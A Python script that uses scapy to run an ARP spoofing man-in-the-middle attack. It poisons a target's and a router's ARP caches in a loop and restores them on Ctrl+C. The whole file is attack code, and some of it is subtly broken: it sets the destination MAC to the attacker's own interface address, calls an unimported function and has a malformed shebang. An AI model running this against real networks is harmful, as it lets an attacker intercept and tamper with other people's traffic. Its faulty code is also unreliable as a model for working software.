#/usr/bin/env python
from scapy.layers.l2 import ARP, get_if_hwaddr, Ether
import scapy.all as scapy
import time
import sys
from utils.arp_spoof_utils import check_port_forwarding
from utils.data import data

check_port_forwarding()

def spoof(target_ip, router_ip):
    target_mac = get_if_hwaddr("eth0")
    packet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
    # make sure the Ether dst matches the hwdst
    eth_packet = Ether(dst=target_mac) / packet
    scapy.sendp(eth_packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = getmacbyip(destination_ip)
    source_mac = getmacbyip(source_ip)
    packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
    # count=4, send packet 4 times just to be sure.
    scapy.send(packet, count=4, verbose=False)

try:
    sent_packets_count = 0

    while True:
        spoof(data["target_ip1"], data["router_ip"])
        spoof(data["router_ip"], data["target_ip1"])
        sent_packets_count = sent_packets_count + 2
        # For Python3 add end="" to the end of the print statement, remove comma
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...... Quiting.")
    restore(data["target_ip1"], data["router_ip"])
    restore(data["router_ip"], data["target_ip1"])